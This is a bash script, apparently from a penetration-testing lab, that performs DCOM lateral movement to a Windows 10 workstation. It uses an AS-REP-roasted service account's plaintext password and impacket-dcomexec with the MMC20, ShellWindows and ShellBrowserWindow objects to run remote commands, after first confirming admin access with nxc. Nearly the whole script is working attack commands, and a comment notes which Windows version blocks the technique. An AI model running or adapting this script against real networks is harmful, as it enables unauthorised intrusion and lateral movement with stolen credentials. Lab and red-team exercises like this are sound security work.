#!/bin/bash
# =============================================================================
# M3.1 — DCOM lateral movement to AREUBEN-WS (CHARLIE)  [VALIDATED on Win10]
# Use the AS-REP-roasted svc_helpdesk (a local admin on AREUBEN-WS) to execute
# code over DCOM. AREUBEN-WS is Windows 10 specifically because Win11 22H2's
# remote-activation hardening blocks these DCOM objects (MMC20/ShellWindows).
# Run FROM Kali, tunnel up (M1), after M2 recovered svc_helpdesk:Chelsea1998.
# =============================================================================
set -u
WS=10.3.30.30
CREDS='charlie.local/svc_helpdesk:Chelsea1998'

echo "== confirm svc_helpdesk is local admin on AREUBEN-WS =="
nxc smb "$WS" -u svc_helpdesk -p Chelsea1998 2>/dev/null | tail -1   # expect (Pwn3d!)

echo "== M3.1 DCOM lateral — dcomexec MMC20 =="
impacket-dcomexec -object MMC20 -silentcommand "$CREDS@$WS" "whoami & hostname" 2>&1 \
  | grep -aiE "charlie|areuben|nt authority" | head -2

echo "== (alternate objects) ShellWindows / ShellBrowserWindow =="
for OBJ in ShellWindows ShellBrowserWindow; do
  echo "-- $OBJ --"
  impacket-dcomexec -object "$OBJ" -silentcommand "$CREDS@$WS" "whoami" 2>&1 \
    | grep -aiE "charlie|nt authority|reuben" | head -1
done
echo "M3.1 PASS: code execution on AREUBEN-WS via DCOM."
